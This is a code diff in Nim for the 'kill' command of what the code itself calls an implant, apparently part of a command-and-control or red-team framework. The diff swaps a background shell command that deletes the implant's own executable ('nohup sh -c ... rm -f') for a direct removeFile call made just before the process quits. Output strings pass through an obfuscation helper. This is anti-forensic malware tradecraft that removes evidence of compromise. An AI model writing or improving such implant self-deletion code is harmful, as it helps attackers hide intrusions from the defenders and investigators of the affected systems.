@@ -1,4 +1,4 @@
-import os, strutils, osproc
+import os, strutils
 import ../../util/strenc
 
 proc kill*(args: seq[string]): string =
@@ -10,22 +10,20 @@ proc kill*(args: seq[string]): string =
         # Return success message before terminating
         result = obf("Implant terminating...")
         
-        # Attempt self-deletion on Linux/macOS
-        when defined(linux) or defined(macosx):
-            try:
-                # Get current executable path
-                let exePath = getAppFilename()
-                when defined verbose:
-                    echo obf("DEBUG: Attempting self-deletion: ") & exePath
-                
-                # Execute rm -f in background to delete after process exits
-                discard execProcess("nohup sh -c 'sleep 1; rm -f \"" & exePath & "\"' >/dev/null 2>&1 &")
-                
-                when defined verbose:
-                    echo obf("DEBUG: Self-deletion command scheduled")
-            except:
-                when defined verbose:
-                    echo obf("DEBUG: Self-deletion failed, continuing with exit")
+        # Attempt self-deletion (works on Linux/macOS, fails silently on Windows)
+        try:
+            let exePath = getAppFilename()
+            when defined verbose:
+                echo obf("DEBUG: Attempting self-deletion: ") & exePath
+            
+            removeFile(exePath)
+            
+            when defined verbose:
+                echo obf("DEBUG: Self-deletion successful")
+        except:
+            # Ignore deletion errors (e.g., file locked on Windows)
+            when defined verbose:
+                echo obf("DEBUG: Self-deletion failed (file may be locked), continuing with exit")
         
         # Exit the process immediately
         quit(0)
